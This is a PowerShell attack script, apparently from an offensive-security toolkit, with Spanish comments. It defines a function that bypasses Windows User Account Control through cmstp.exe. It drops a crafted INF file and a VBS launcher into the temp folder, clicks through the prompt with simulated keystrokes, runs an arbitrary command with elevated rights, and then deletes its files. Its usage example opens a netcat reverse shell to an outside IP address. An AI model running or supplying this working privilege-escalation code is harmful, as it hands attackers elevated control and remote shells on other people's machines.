function BypassUAC-CMSTP {param($comando)
<#
.SYNOPSIS
    BypassUAC CMSTP.
    PowerShell Function: BypassUAC-CMSTP
    Author: Luis Vacas de Santos
    Dependencias Requeridas: Ninguna
    Dependencias Opcionales: Ninguna
.DESCRIPTION
    BypassUAC-CMSTP  Bypass to the UAC using CMSTP.
.EXAMPLE
    BypassUAC-CMSTP -comando "nc 10.10.10.10 443 -e cmd.exe"
    -----------
    Ejecutariamos nc con privilegios elevados.
   
#>
if ($comando -eq $null) {break}
$inf = @"
[version]
Signature=`$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
wscript c:\windows\temp\owned.vbs
taskkill /IM cmstp.exe /F

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7

[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""

[Strings]
ServiceName="CabeshaVPN"
ShortSvcName="CabeshaVPN"
"@

$proceso = @"
Dim WShell
Set WShell = CreateObject("WScript.Shell")
WShell.Run "CABESHAOWNED", 0
Set WShell = Nothing
"@

$proceso = $proceso.Replace("CABESHAOWNED",$comando)
$proceso | Out-File c:\windows\temp\owned.vbs -Encoding ascii
if ((Get-Process cmstp -ErrorAction SilentlyContinue).count -ge 1) { Get-Process cmstp | Stop-Process}
$inf | Out-File c:\windows\temp\cabesha.inf -Encoding ascii
cmstp.exe /au c:\windows\temp\cabesha.inf 
$wshell = New-Object -ComObject wscript.shell;
sleep -Seconds 1
$proceso_id = (Get-Process "cmstp").id
if ($proceso_id.count -ge 1) {foreach ($procc in $proceso_id) {$wshell.AppActivate($procc);sleep -Seconds 1; $wshell.SendKeys('{ENTER}')}}
$wshell.AppActivate($proceso_id)
cmstp.exe /s c:\windows\temp\cabesha.inf
$wshell.SendKeys('{ENTER}')
$shell = New-Object -ComObject "Shell.Application"
$shell.UndoMinimizeALL()
$wshell.SendKeys('{ENTER}')
sleep -Seconds 5
cmstp /u /s c:\windows\temp\cabesha.inf
sleep -Seconds 5
Remove-Item c:\windows\temp\cabesha.inf
Remove-Item c:\windows\temp\owned.vbs


}

